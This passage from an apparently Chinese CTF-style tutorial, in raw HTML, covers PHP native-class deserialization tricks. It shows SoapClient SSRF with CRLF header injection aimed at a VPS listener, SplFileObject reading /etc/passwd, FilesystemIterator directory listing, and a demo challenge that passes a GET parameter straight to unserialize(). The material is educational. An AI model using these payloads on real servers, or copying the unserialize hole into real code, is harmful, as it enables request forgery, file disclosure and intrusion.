class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070311231.png\" alt=\"image-20230407031157033\"></p>\n<p>插入POST报文</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'http://VPS:7777'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'user_agent'</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"quan9i\\r\\n\\r\\nPOSTtest\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'uri'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'qwq'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$c</span> <span class=\"token operator\">-></span> <span class=\"token function\">abc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070314860.png\" alt=\"image-20230407031439662\"></p>\n<p>此时还有一个问题就是传输<code>POST数据</code>时需遵循<code>HTTP协议</code>，所以 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，<code>Content-type</code>的值在<code>User-Agent</code>下方，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code>，构造代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'http://VPS:7777'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$post_data</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'qwq=1'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$headers</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'X-Forwarded-For: 127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$target</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'qwq^^Content-Type: application/x-www-form-urlencoded^^'</span><span class=\"token operator\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'^^'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$headers</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'^^Content-Length: '</span><span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post_data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'^^^^'</span><span class=\"token operator\">.</span><span class=\"token variable\">$post_data</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'^^'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\n\\r\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行文件</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070329598.png\" alt=\"image-20230407032900371\"></p>\n<p>可以看出成功挤掉了原来的<code>Content-type</code>，我们成功上传了一个新的<code>Content-type</code></p>\n<h2 id=\"文件读取\"><a href=\"#文件读取\" class=\"headerlink\" title=\"文件读取\"></a>文件读取</h2><h3 id=\"SplFileObject\"><a href=\"#SplFileObject\" class=\"headerlink\" title=\"SplFileObject\"></a>SplFileObject</h3><h4 id=\"定义-1\"><a href=\"#定义-1\" class=\"headerlink\" title=\"定义\"></a>定义</h4><p><strong>plFileObject 类</strong>为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。该类部分代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SplFileObject</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">SplFileInfo</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">RecursiveIterator</span><span class=\"token punctuation\">,</span> SeekableIterator <span class=\"token punctuation\">&#123;</span>\n<span class=\"token comment\">/* 常量 */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">const</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token constant\">DROP_NEW_LINE</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">const</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token constant\">READ_AHEAD</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">const</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token constant\">SKIP_EMPTY</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">const</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token constant\">READ_CSV</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/* 方法 */</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$mode</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"r\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword type-hint\">bool</span> <span class=\"token variable\">$useIncludePath</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span>\n    <span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">resource</span> <span class=\"token variable\">$context</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span>\n<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">eof</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">fgetc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">fgetcsv</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$separator</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\",\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$enclosure</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$escape</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\\\\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">fgetss</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$allowable_tags</span> <span class=\"token operator\">=</span> <span class=\"token operator\">?</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">flock</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$operation</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">int</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$wouldBlock</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">fpassthru</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">fputcsv</span><span class=\"token punctuation\">(</span>\n    <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$fields</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$separator</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\",\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$enclosure</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\\"\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$escape</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\\\\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$eol</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\n\"</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">false</span>\n<span class=\"token operator\">...</span>\n<span class=\"token comment\">/* 继承的方法 */</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">SplFileInfo</span><span class=\"token operator\">::</span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>该类的构造方法可以构造一个新的文件对象用于后续的读取。其大致原理可简单解释一下，当类中<code>__tostring</code>魔术方法被触发时，如果类中内容为存在文件名，那么它会对此文件名进行内容获取。</p>\n<h4 id=\"简单利用\"><a href=\"#简单利用\" class=\"headerlink\" title=\"简单利用\"></a>简单利用</h4><p>读取文件方法如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$context</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SplFileObject</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$context</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080138207.png\" alt=\"image-20230408013826170\"></p>\n<p>成功读取文件，但从中可看出，这样的话只能读取一行，因此如果我们想读取多行的话，需要进行一个遍历输出，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$dir</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SplFileObject</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080141730.png\" alt=\"image-20230408014141677\"></p>\n<h2 id=\"遍历目录\"><a href=\"#遍历目录\" class=\"headerlink\" title=\"遍历目录\"></a>遍历目录</h2><h3 id=\"FilesystemIterator\"><a href=\"#FilesystemIterator\" class=\"headerlink\" title=\"FilesystemIterator\"></a>FilesystemIterator</h3><h4 id=\"定义-2\"><a href=\"#定义-2\" class=\"headerlink\" title=\"定义\"></a>定义</h4><p>DirectoryIterator 类可以理解为文件系统迭代器，其构造方法将会创建一个指定目录的迭代器</p>\n<p>该类的部分代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">FilesystemIterator</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">DirectoryIterator</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token comment\">/* Methods */</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$directory</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$flags</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">FilesystemIterator</span><span class=\"token operator\">::</span><span class=\"token class-name\">KEY_AS_PATHNAME</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token operator\">::</span><span class=\"token class-name\">CURRENT_AS_FILEINFO</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token operator\">::</span><span class=\"token constant\">SKIP_DOTS</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token class-name\">SplFileInfo</span><span class=\"token operator\">|</span><span class=\"token class-name\">FilesystemIterator</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">getFlags</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">int</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">key</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">rewind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token keyword\">public</span> <span class=\"token function\">setFlags</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$flags</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token comment\">/* Inherited methods */</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">mixed</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">getBasename</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$suffix</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">getExtension</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">getFilename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">isDot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">key</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">mixed</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">rewind</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">seek</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$offset</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">DirectoryIterator</span><span class=\"token operator\">::</span><span class=\"token function\">valid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n<span class=\"token operator\">...</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">SplFileInfo</span><span class=\"token operator\">::</span><span class=\"token function\">setFileClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">SplFileObject</span><span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">SplFileInfo</span><span class=\"token operator\">::</span><span class=\"token function\">setInfoClass</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">SplFileInfo</span><span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name static-context\">SplFileInfo</span><span class=\"token operator\">::</span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"原理-3\"><a href=\"#原理-3\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>此类内置了<code>__tostring</code>函数，当我们用了这个类，且对其进行<code>echo</code>或其他操作时，会触发<code>__tostring</code>函数，此时会返回这个迭代器的第一项，亦即返回文件名。</p>\n<h4 id=\"简单利用-1\"><a href=\"#简单利用-1\" class=\"headerlink\" title=\"简单利用\"></a>简单利用</h4><p>直接利用函数并输出的话它只能输出一个文件名，因此需要一个遍历函数，这样才能获取指定目录的全部文件名。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070143045.png\" alt=\"image-20230407014318710\"></p>\n<p>成功输出根目录文件名</p>\n<h4 id=\"demo-3\"><a href=\"#demo-3\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>现有题目如下(代码参考自<a href=\"http://arsenetang.com/2021/10/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8/#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%8F%8A%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C\">http://arsenetang.com</a>)</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'flag就在这个目录下的某个目录中的文件里'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/br>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">A</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$para</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token keyword\">new</span>  <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">para</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" 